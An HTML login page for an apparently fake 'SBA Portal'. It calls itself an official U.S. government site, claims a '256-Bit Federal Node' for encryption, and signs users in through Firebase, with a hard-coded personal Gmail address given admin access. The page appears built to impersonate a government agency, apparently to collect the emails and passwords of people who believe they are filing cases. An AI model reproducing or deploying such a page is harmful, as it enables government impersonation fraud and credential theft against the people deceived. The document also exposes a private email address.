<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SBA Portal | Secure Login</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;700;900&display=swap');
        :root { --sba-blue: #002e6d; --sba-red: #cc0000; }
        body { font-family: 'Public Sans', sans-serif; background-color: #f1f5f9; color: #1e293b; }
        
        /* Matching Logo Box from Register */
        .sba-logo-box { position: relative; display: inline-block; padding: 4px 6px; }
        .sba-logo-box::before { content: ""; position: absolute; top: 0; left: 0; right: 0; bottom: 4px; border-top: 2.5px solid var(--sba-blue); border-left: 2.5px solid var(--sba-blue); border-right: 2.5px solid var(--sba-blue); }
        .sba-logo-box::after { content: ""; position: absolute; bottom: 0; left: 0; right: 30%; height: 2.5px; background: var(--sba-red); }

        /* Matching Card Constraints */
        .auth-card { background: white; border-top: 4px solid var(--sba-blue); box-shadow: 0 4px 20px rgba(0,0,0,0.05); border-radius: 2px; }
        
        input { font-size: 14px !important; border-radius: 2px !important; transition: all 0.2s; }
        input:focus { border-color: var(--sba-blue) !important; outline: none !important; background: #fff !important; }

        .btn-sba { background: var(--sba-blue); transition: all 0.2s; font-size: 11px; letter-spacing: 1px; font-weight: 900; }
        .btn-sba:disabled { opacity: 0.6; cursor: not-allowed; }
    </style>
</head>
<body class="min-h-screen flex flex-col">

    <div class="bg-[#f0f0f0] py-1.5 px-4 flex items-center gap-2 border-b border-gray-200">
        <img src="https://upload.wikimedia.org/wikipedia/en/a/a4/Flag_of_the_United_States.svg" class="w-3.5 shadow-sm">
        <span class="text-[9px] font-bold text-gray-500 uppercase tracking-tight">Official U.S. Government Portal</span>
    </div>

    <nav class="bg-white px-5 py-3 flex justify-between items-center border-b border-gray-100 sticky top-0 z-50">
        <div class="flex items-center gap-2">
            <div class="sba-logo-box">
                <span class="text-lg font-black text-[#002e6d] tracking-tighter uppercase">SBA</span>
            </div>
            <p class="text-[9px] font-black text-[#002e6d] uppercase leading-none hidden sm:block">Administration</p>
        </div>
        <a href="register.html" class="text-[10px] font-black text-slate-400 hover:text-red-600 uppercase">Enroll Now</a>
    </nav>

    <main class="flex-grow flex items-center justify-center p-4">
        <div class="w-full max-w-[400px]"> <div class="auth-card p-6 md:p-10"> <div class="text-center mb-8">
                    <h2 class="text-2xl font-black text-slate-800 uppercase tracking-tighter">Portal Access</h2>
                    <p class="text-slate-400 text-[10px] font-bold uppercase tracking-[0.2em] mt-2">Personnel Authentication Protocol</p>
                </div>

                <div id="alertBox" class="hidden mb-6 p-4 bg-red-50 border-l-4 border-red-600 text-red-700 text-[11px] font-bold uppercase italic shadow-sm"></div>

                <form id="loginForm" class="space-y-5">
                    <div>
                        <label class="block text-[10px] font-black text-slate-400 uppercase tracking-widest mb-2">Account Email</label>
                        <div class="relative">
                            <span class="absolute inset-y-0 left-0 pl-4 flex items-center text-slate-300">
                                <i class="fas fa-user-shield text-xs"></i>
                            </span>
                            <input type="email" id="email" required class="w-full pl-10 pr-4 py-3.5 bg-slate-50 border border-slate-200 outline-none" placeholder="Enter ID Email">
                        </div>
                    </div>

                    <div>
                        <div class="flex justify-between items-center mb-2">
                            <label class="block text-[10px] font-black text-slate-400 uppercase tracking-widest">Secure Passkey</label>
                            <a href="forgot-password.html" class="text-[9px] font-black text-blue-700 uppercase hover:underline">Reset?</a>
                        </div>
                        <div class="relative">
                            <span class="absolute inset-y-0 left-0 pl-4 flex items-center text-slate-300">
                                <i class="fas fa-lock text-xs"></i>
                            </span>
                            <input type="password" id="pass" required class="w-full pl-10 pr-4 py-3.5 bg-slate-50 border border-slate-200 outline-none" placeholder="••••••••">
                        </div>
                    </div>

                    <button type="submit" id="submitBtn" class="btn-sba w-full text-white py-4 shadow-xl uppercase mt-4">
                        Authorize Session
                    </button>
                </form>

                <div class="mt-8 pt-6 border-t border-slate-100 text-center">
                    <p class="text-[10px] text-slate-400 font-bold uppercase mb-2">No active case found?</p>
                    <a href="register.html" class="text-[#cc0000] font-black text-[11px] uppercase tracking-[0.2em] hover:text-red-700 transition-all">
                        Register New Case File
                    </a>
                </div>
            </div>
        </div>
    </main>

    <footer class="py-6 text-center text-[9px] text-slate-400 font-bold uppercase tracking-[0.3em]">
        <i class="fas fa-lock mr-2 text-slate-300"></i> Encrypted 256-Bit Federal Node-V15
    </footer>

    <script type="module">
        import { auth } from './firebase-config.js';
        import { signInWithEmailAndPassword, signOut } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";

        const btn = document.getElementById('submitBtn');
        const alertBox = document.getElementById('alertBox');
        const ADMIN_EMAIL = "liger4683@gmail.com";

        document.getElementById('loginForm').onsubmit = async (e) => {
            e.preventDefault();
            alertBox.classList.add('hidden');
            
            const email = document.getElementById('email').value.toLowerCase().trim();
            const pass = document.getElementById('pass').value;

            btn.disabled = true;
            btn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i> AUTHORIZING...';

            try {
                const userCredential = await signInWithEmailAndPassword(auth, email, pass);
                const user = userCredential.user;

                if (email === ADMIN_EMAIL) {
                    window.location.href = "admin-portal.html";
                    return;
                }

                if (user.emailVerified) {
                    window.location.href = "dashboard.html";
                } else {
                    await signOut(auth);
                    window.location.href = "verify.html?email=" + encodeURIComponent(email);
                }

            } catch (error) {
                btn.disabled = false;
                btn.innerText = "Authorize Session";
                alertBox.classList.remove('hidden');
                
                if (error.code === 'auth/user-not-found') {
                    alertBox.innerText = "DENIED: Case file not found.";
                } else if (error.code === 'auth/wrong-password') {
                    alertBox.innerText = "DENIED: Invalid passkey protocol.";
                } else {
                    alertBox.innerText = "ACCESS DENIED: Credentials mismatch.";
                }
            }
        };

        function showAlert(msg) {
            alertBox.innerText = msg;
            alertBox.classList.remove('hidden');
            window.scrollTo({ top: 0, behavior: 'smooth' });
        }
    </script>
</body>
</html>
